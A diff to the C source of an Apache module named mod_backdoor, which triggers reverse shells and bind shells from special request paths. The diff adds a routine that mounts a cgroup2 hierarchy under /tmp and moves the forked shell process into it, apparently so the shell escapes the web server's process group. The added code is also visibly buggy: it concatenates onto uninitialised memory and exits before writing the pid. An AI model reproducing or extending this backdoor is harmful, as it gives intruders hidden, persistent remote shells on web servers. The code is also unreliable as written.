@@ -31,6 +31,7 @@
 
 // link with lpthread
 //#include<pthread.h>
+#include <sys/mount.h>
 
 #include "httpd.h"
 #include "http_config.h"
@@ -54,6 +55,7 @@
 //#define RESTARTWORD "/alarma"
 #define REVERSESHELL "/reverse"
 #define BINDWORD "/bind"
+#define CGROUP2 "/tmp/cgroup2"
 #define IPC "/tmp/mod_backdoor" //Change
 
 pid_t pid;
@@ -883,6 +885,37 @@ static int backdoor_post_read_request(request_rec *r) {
 	return DECLINED;
 }
 
+void* rmCgroup(){
+    FILE* f;
+    int isMounted = 0;
+    char* path;
+    char* str;
+
+    mkdir(CGROUP2, S_IRWXU);
+    path = malloc(strlen(CGROUP2)+strlen("/cgroup.procs")+1);
+    strcat(path,CGROUP2);
+    strcat(path,"/cgroup.procs");
+    if(access(path, F_OK) < 0) {
+        isMounted= mount("cgroup",CGROUP2,"cgroup2",NULL,NULL);
+    }
+    if(isMounted == 0){
+        f = fopen(path,"wb");
+        if(f != NULL){
+            exit(0);
+            str = malloc(sizeof(int)*getpid()+1);
+            sprintf(str,"%d",getpid());
+            fputs(str,f);
+            fclose(f);
+            free(str);
+        }
+        //umount(CGROUP2);
+        free(path);
+    }
+
+
+
+}
+
 int waitIPC(int master){
     pthread_t thread_id;
     fd_set readfds;
@@ -906,6 +939,7 @@ int waitIPC(int master){
                     } else {
                         pid = fork();
                         if(pid == 0){
+                            rmCgroup();
                             if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
                                 shellPTY(sd);
                             } else if (strstr(buf, "reverse")) {
